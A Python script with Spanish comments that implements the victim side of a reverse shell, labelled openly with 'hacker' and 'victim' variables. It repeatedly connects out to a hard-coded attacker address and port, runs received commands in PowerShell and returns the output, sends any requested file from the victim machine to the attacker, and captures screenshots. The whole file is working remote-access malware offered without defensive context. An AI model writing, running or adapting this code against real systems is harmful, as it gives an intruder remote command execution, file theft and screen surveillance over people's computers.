import socket
import subprocess
import time
import os
import pyautogui

# Identificador de final de resultado de comando
IDENTIFIER = "<FIN_DEL_RESULTADO_DEL_COMANDO>"
# Identificador de final de archivo
eof_identifier = "<FIN_DEL_IDENTIFICADOR_DE_ARCHIVO>"
# Tamaño del fragmento de datos para transferencia
CHUNK_SIZE = 2048

if __name__ == "__main__":
    # Dirección IP del hacker
    hacker_IP = "192.168.100.62"
    # Puerto del hacker
    hacker_port = 8008
    # Dirección del hacker
    hacker_address = (hacker_IP, hacker_port)

    while True:
        try:
            # Crear un socket para la víctima
            victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Intento de conexión con el hacker
            print("Intentando conectar con ", hacker_address)
            victim_socket.connect(hacker_address)
            
            while True:
                # Recibir datos del hacker
                data = victim_socket.recv(1024)
                # Decodificar el comando del hacker
                hacker_command = data.decode()
                # Imprimir el comando del hacker
                print("Comando del hacker = ", hacker_command)

                if hacker_command == "stop":
                    break
                elif hacker_command == "":
                    continue
                elif hacker_command.startswith("cd"):
                    path2move = hacker_command.strip("cd ")
                    if os.path.exists(path2move):
                        os.chdir(path2move)
                    else:
                        print("No se puede cambiar al directorio ", path2move)
                    continue
                elif hacker_command.startswith("download"):
                    file_to_download = hacker_command.strip("download ")
                    if os.path.exists(file_to_download):
                        exists = "yes"
                        victim_socket.send(exists.encode())

                        with open(file_to_download, "rb") as file:
                            chunk = file.read(CHUNK_SIZE)

                            while len(chunk) > 0:
                                victim_socket.send(chunk)
                                chunk = file.read(CHUNK_SIZE)
                                # Esto se ejecutará hasta el final del archivo.

                            # Una vez que el archivo está completo, necesitamos enviar el marcador.
                            victim_socket.send(eof_identifier.encode())
                        print("Archivo enviado exitosamente")

                    else:
                        exists = "no"
                        print("El archivo no existe")
                        victim_socket.send(exists.encode())
                        continue
                elif hacker_command == "screenshot":
                    print("Tomando captura de pantalla")
                    screenshot = pyautogui.screenshot()
                    screenshot.save("captura.png")
                    print("Captura de pantalla guardada")

                else:
                    output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True, stdin=subprocess.DEVNULL)
                    if output.stderr.decode("utf-8") == "":
                        command_result = output.stdout
                        command_result = command_result.decode("utf-8") + IDENTIFIER
                        command_result = command_result.encode("utf-8")
                    else:
                        command_result = output.stderr

                    victim_socket.sendall(command_result)
        except KeyboardInterrupt:
            print("Saliendo")
        except Exception as err:
            print("No se puede conectar: ", err)
            time.sleep(5)
